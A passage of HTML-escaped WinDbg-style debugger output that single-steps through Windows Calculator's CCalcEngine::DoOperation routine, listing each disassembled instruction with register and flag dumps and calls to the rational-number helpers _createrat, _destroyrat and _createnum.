/&gt;calc!CCalcEngine::DoOperation+0xd6:&lt;br /&gt;0049502d 8b4508&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ebp+8] ss:0023:0020e390=0000005b&lt;br /&gt;eax=0000005b ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00495030 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0xd9:&lt;br /&gt;00495030 83c0aa&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,0FFFFFFAAh&lt;br /&gt;eax=00000005 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00495033 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz ac pe cy&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000217&lt;br /&gt;calc!CCalcEngine::DoOperation+0xdc:&lt;br /&gt;00495033 83f80b&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,0Bh&lt;br /&gt;eax=00000005 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00495036 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei ng nz ac pe cy&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000297&lt;br /&gt;calc!CCalcEngine::DoOperation+0xdf:&lt;br /&gt;00495036 0f870f050000&amp;nbsp;&amp;nbsp;&amp;nbsp; ja&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!CCalcEngine::DoOperation+0x930 (0049554b) [br=0]&lt;br /&gt;eax=00000005 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049503c esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei ng nz ac pe cy&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000297&lt;br /&gt;calc!CCalcEngine::DoOperation+0xe5:&lt;br /&gt;0049503c ff2485cc4f4900&amp;nbsp; jmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr calc!CCalcEngine::DoOperation+0x96c (00494fcc)[eax*4] ds:0023:00494fe0=0049132d&lt;br /&gt;eax=00000005 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049132d esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei ng nz ac pe cy&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000297&lt;br /&gt;calc!CCalcEngine::DoOperation+0x517:&lt;br /&gt;0049132d ff75ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-14h]&amp;nbsp; ss:0023:0020e374=00000000&lt;br /&gt;eax=00000005 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491330 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei ng nz ac pe cy&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000297&lt;br /&gt;calc!CCalcEngine::DoOperation+0x51a:&lt;br /&gt;00491330 33c0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491332 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x51c:&lt;br /&gt;00491332 40&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&lt;br /&gt;eax=00000001 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491333 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x51d:&lt;br /&gt;00491333 89450c&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp+0Ch],eax ss:0023:0020e394=006cc420&lt;br /&gt;eax=00000001 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491336 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x520:&lt;br /&gt;00491336 8945e8&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-18h],eax ss:0023:0020e370=0020ea30&lt;br /&gt;eax=00000001 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491339 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x523:&lt;br /&gt;00491339 e8670dfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_destroyrat (004720a5)&lt;br /&gt;eax=00000001 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049133e esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x528:&lt;br /&gt;0049133e 33ff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,edi&lt;br /&gt;eax=00000001 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491340 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x52a:&lt;br /&gt;00491340 897dec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-14h],edi ss:0023:0020e374=00000000&lt;br /&gt;eax=00000001 ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491343 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x52d:&lt;br /&gt;00491343 e83e0dfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_createrat (00472086)&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491348 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x532:&lt;br /&gt;00491348 8945ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-14h],eax ss:0023:0020e374=00000000&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049134b esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x535:&lt;br /&gt;0049134b ff30&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:00375548=00000000&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049134d esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x537:&lt;br /&gt;0049134d e8870dfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_destroynum (004720d9)&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491352 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x53c:&lt;br /&gt;00491352 8b45ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ebp-14h] ss:0023:0020e374=00375548&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491355 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x53f:&lt;br /&gt;00491355 8938&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax],edi&amp;nbsp; ds:0023:00375548=00000000&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491357 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x541:&lt;br /&gt;00491357 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491359 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x543:&lt;br /&gt;00491359 8b00&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [eax]&amp;nbsp; ds:0023:00379df0=00379d90&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049135b esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x545:&lt;br /&gt;0049135b ff7004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4]&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:00379d94=00000001&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049135e esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x548:&lt;br /&gt;0049135e e8910dfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_createnum (004720f4)&lt;br /&gt;eax=00378300 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491363 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x54d:&lt;br /&gt;00491363 8b4dec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,dword ptr [ebp-14h] ss:0023:0020e374=00375548&lt;br /&gt;eax=00378300 ebx=006cc278 ecx=00375548 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491366 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x550:&lt;br /&gt;00491366 8901&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ecx],eax&amp;nbsp; ds:0023:00375548=00000000&lt;br /&gt;eax=00378300 ebx=006cc278 ecx=00375548 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491368 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x552:&lt;br /&gt;00491368 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00375548 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049136a esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x554:&lt;br /&gt;0049136a 8b00&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 